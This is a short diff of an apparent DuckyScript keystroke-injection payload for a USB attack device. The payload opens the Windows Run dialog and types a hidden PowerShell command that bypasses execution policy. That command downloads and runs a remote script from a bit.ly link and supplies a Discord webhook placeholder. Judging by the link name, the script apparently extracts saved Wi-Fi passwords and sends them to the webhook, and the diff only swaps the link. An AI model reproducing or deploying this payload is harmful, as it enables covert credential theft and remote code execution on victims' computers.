@@ -12,4 +12,4 @@ REM ###################################################################
 DELAY 2000
 GUI r
 DELAY 250
-STRINGLN powershell -w h -ep bypass $discord='<your_webhook_here>';irm bit.ly/WLAN-Windows-Password | iex
+STRINGLN powershell -w h -ep bypass $discord='<your_webhook_here>';irm bit.ly/ENG-WLAN-Windows-Password | iex
